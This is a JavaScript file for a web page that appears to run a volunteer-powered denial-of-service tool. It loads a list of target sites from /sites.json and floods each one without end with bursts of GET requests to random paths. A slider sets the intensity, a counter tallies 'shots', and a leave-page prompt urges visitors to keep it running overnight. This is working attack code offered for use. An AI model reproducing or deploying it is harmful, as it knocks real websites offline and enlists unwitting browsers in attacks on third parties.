const MULTIPLY = 10
var queue = []

$(document).ready(function () {
    $.getJSON("/sites.json", function (data) {
        launchAttack(data);
    }).fail(function () {
        console.log("An error has occurred.");
    });

    $("#bookmarkme").click(function () {
        if (window.sidebar) { // Mozilla Firefox Bookmark
            window.sidebar.addPanel(location.href, document.title, "");
        } else if (window.external) { // IE Favorite
            window.external.AddFavorite(location.href, document.title);
        }
        else if (window.opera && window.print) { // Opera Hotlist
            this.title = document.title;
            return true;
        }
    });

    $(window).bind('beforeunload', function(){
        return 'Why not leave it running all night long?';
    });
});

async function launchAttack(list) {
    list = shuffle(list);
    while (true) {
        for (var i = 0, c = list.length; i < c; i++) {
            await sleep(2000);
            flash(list[i].name);
            attackOne(list[i].url);
        }
    }

}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function attackOne(url) {
    flood(url);
}

async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
        method: 'GET',
        mode: 'no-cors',
        signal: controller.signal
    }).then((response) => {
        clearTimeout(id);
        return response;
    }).catch((error) => {
        clearTimeout(id);
        throw error;
    });
}

async function flood(target) {
    for (var i = 0; i < $('input[type="range"]').val() * MULTIPLY ; ++i) {
        if (queue.length > $('input[type="range"]').val() * MULTIPLY) {
            await queue.shift()
        }
        rand = i % 3 === 0 ? '' : makePath(2000);
        queue.push(
            fetchWithTimeout(target + rand, { timeout: 10 })
                .catch((error) => {
                    if (error.code === 20 /* ABORT */) {
                        return;
                    }
                    //targets[target].number_of_errored_responses++;
                })
                .then((response) => {
                    if (response && !response.ok) {
                        //targets[target].number_of_errored_responses++;
                    }
                    //targets[target].number_of_requests++;
                    updateBulletsCount();
                })

        )
    }
}

function flash(name) {
    $('#attack').text( $('input[type="range"]').val() * MULTIPLY + ' shots at ' + name )
}

function updateBulletsCount() {
    var c = $('#bullets-count').text();
    c++;
    $('#bullets-count').text(c);
}

function makePath(max_length) {
    var out = ''
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    length = Math.floor(Math.random() * max_length);
    while (out.length < length) {
        length
        result = '';
        for (var i = 0; i < (Math.floor(Math.random() * 20)); i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        out = out + '/' + result;
    }
    return out.substring(1);
}

function shuffle(array) {
    let currentIndex = array.length, randomIndex;

    // While there remain elements to shuffle...
    while (currentIndex != 0) {

        // Pick a remaining element...
        randomIndex = Math.floor(Math.random() * currentIndex);
        currentIndex--;

        // And swap it with the current element.
        [array[currentIndex], array[randomIndex]] = [
            array[randomIndex], array[currentIndex]];
    }

    return array;
}

// Change style of navbar on scroll
window.onscroll = function () { myFunction() };
function myFunction() {
    var navbar = document.getElementById("myNavbar");
    if (document.body.scrollTop > 100 || document.documentElement.scrollTop > 100) {
        navbar.className = "w3-bar" + " w3-card" + " w3-animate-top" + " w3-white";
    } else {
        navbar.className = navbar.className.replace(" w3-card w3-animate-top w3-white", "");
    }
}


// Google translate 

function googleTranslateElementInit() {
    new google.translate.TranslateElement({ pageLanguage: 'en' }, 'google_translate_element');
}


// Range slider 
const $element = $('input[type="range"]');
const $tooltip = $('#range-tooltip');
const sliderStates = [
    { name: "low", tooltip: "Every little bit of help counts !", range: _.range(5, 26) },
    { name: "med", tooltip: "Good level for mobiles!", range: _.range(26, 51) },
    { name: "high", tooltip: "Let's go!", range: _.range(52, 75) },
    { name: "superb", tooltip: "Fry that face ! Seal that mouth !", range: [76] },
];
var currentState;
var $handle;

$element
    .rangeslider({
        polyfill: false,
        onInit: function () {
            $handle = $('.rangeslider__handle', this.$range);
            updateHandle($handle[0], this.value);
            updateState($handle[0], this.value);
        }
    })
    .on('input', function () {
        updateHandle($handle[0], this.value);
        checkState($handle[0], this.value);
    });

// Update the value inside the slider handle
function updateHandle(el, val) {
    el.textContent = val;
}

// Check if the slider state has changed
function checkState(el, val) {
    // if the value does not fall in the range of the current state, update that shit.
    if (!_.contains(currentState.range, parseInt(val))) {
        updateState(el, val);
    }
}

// Change the state of the slider
function updateState(el, val) {
    for (var j = 0; j < sliderStates.length; j++) {
        if (_.contains(sliderStates[j].range, parseInt(val))) {
            currentState = sliderStates[j];
            // updateSlider();
        }
    }
    // If the state is high, update the handle count to read 50+
    //if (currentState.name == "superb") {
    //    updateHandle($handle[0], "75+");
    //}
    // Update handle color
    $handle
        .removeClass(function (index, css) {
            return (css.match(/(^|\s)js-\S+/g) || []).join(' ');
        })
        .addClass("js-" + currentState.name);
    // Update tooltip
    $tooltip.html(currentState.tooltip);
}

